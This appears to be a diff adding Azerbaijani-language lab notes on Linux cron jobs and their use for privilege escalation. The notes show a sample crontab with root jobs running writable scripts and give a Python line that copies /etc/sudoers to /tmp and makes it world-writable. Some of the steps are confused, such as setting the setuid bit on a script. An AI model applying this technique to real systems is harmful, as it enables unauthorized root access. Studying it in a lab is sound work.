@@ -1,0 +1,134 @@
+## cron job ile crontab in ferqi nedir?
+
+# cron job - Prosessin adidir
+#crontab -onun yazildigi config faylin adidir
+
+/etc/crontab -- edib baxilir
+
+------------
+# crontab nedir?
+
+Cron işləri müəyyən vaxtlarda skriptləri və ya ikili faylları işə salmaq üçün istifadə olunur. 
+Varsayılan olaraq, onlar cari istifadəçinin deyil, sahiblərinin imtiyazı ilə işləyirlər.
+Düzgün konfiqurasiya edilmiş cron işləri təbii olaraq həssas olmasa da, bəzi şərtlər altında imtiyazların yüksəldilməsi vektorunu təmin edə bilər.
+---------------------
+misal:
+
+-- cat /etc/crontab
+-----------------------------------
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+* * * * *  root /antivirus.sh
+* * * * *  root antivirus.sh
+* * * * *  root /home/karen/backup.sh
+* * * * *  root /tmp/test.py
+-------------------------
+
+
+burada:
+
+* * * * *  root /antivirus.sh
+* * * * *  root antivirus.sh
+* * * * *  root /home/karen/backup.sh
+* * * * *  root /tmp/test.py
+
+bunlar run olunan fayillardir.
+
+------
+Qeyd:
+bu fayllari runlamaq ucun ilk once root olmaq lazimdir,mis ucun tmp deki test.py faylin runlamaq ucun python 
+dan istifade etmek lazimdir.bunun ucun nano ile yeni fayl yaradilir test.py adinda ve python dilinde runlamaq ucun pythonun 
+basa duseceyi sekilde izah etmek lazimdir. 
+bunun ucun:
+
+plan hazirlayaq.
+1.test.py faylin cp ele  tmp ye getir(eger deyilse) cunki esas fayl oz yerinde qalsin biz tmp ye getirib  uzerinde deyisiklik etmeliyik
+2.gelmesi ucun 7 saniye gozlet 
+3.oxuma icazesi ver
+4.OXU
+
+
+
+
+
+--nano test.py      (fayl acilir)
+-- #!/usr/bin/python3   (bu o demekdir ki , siteme bildirik ki QARDAS men buradan istfade edib yazacam)
+--import os        ( bu o demekdir ki operaition system in kitabxanasini import ele,bele yadda saxla ki biri bize dese ki get 
+                    riyaziyyati biologiya kitabindan oxu , demerik ki delisen nesen riyaziyyat hara biologiya hara :) buna gore import os edilir ki
+                    gedib oradan getirsin yeni bir nov ele bil ki kodnan basa saliram)
+bununda nece etmeyimizi bilirikse onda google da axtaris edirk ki:
+'import os execute example' yaziriq ve axtaris edirik
+
+--os.system("cp /etc/sudoers /tmp/sudoers && sleep 7 && chmod 666 /tmp/sudoers")
+
+(burada os.system o demekdir ki getsin os de runlasin,daha sonra etc/sudoers i cp ele ve 7 saniye gozle
+daha sonra 666 icazesin ver)
+
+daha sonra nano nu baglayirq
+
+bunu yazsaq bele sistem bunu runlaya bilmeyecek onun ucun:
+-- chmod u+s test.py edirik
+
+karen@ip-10-10-217-128:/tmp$ ls -la -a
+total 48
+drwxrwxrwt 11 root  root  4096 Jan 27 03:40 .
+drwxr-xr-x 19 root  root  4096 Jan 27 02:19 ..
+drwxrwxrwt  2 root  root  4096 Jan 27 02:19 .ICE-unix
+drwxrwxrwt  2 root  root  4096 Jan 27 02:19 .Test-unix
+drwxrwxrwt  2 root  root  4096 Jan 27 02:19 .X11-unix
+drwxrwxrwt  2 root  root  4096 Jan 27 02:19 .XIM-unix
+drwxrwxrwt  2 root  root  4096 Jan 27 02:19 .font-unix
+drwx------  3 root  root  4096 Jan 27 02:19 snap.lxd
+drwx------  3 root  root  4096 Jan 27 02:19 systemd-private-d9cf1cf56b4343afb10b57821d5ac4ad-systemd-logind.service-f9Slqh
+drwx------  3 root  root  4096 Jan 27 02:19 systemd-private-d9cf1cf56b4343afb10b57821d5ac4ad-systemd-resolved.service-JthR2g
+drwx------  3 root  root  4096 Jan 27 02:19 systemd-private-d9cf1cf56b4343afb10b57821d5ac4ad-systemd-timesyncd.service-jaGg2h
+-----
+-rwxrwxr-x  1 karen karen  111 Jan 27 03:39 test.py
+-----
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+-------------
+2 kodu birlesdirmek ucun :
+--&& istifade olunur
+-------------
+
+
+
+
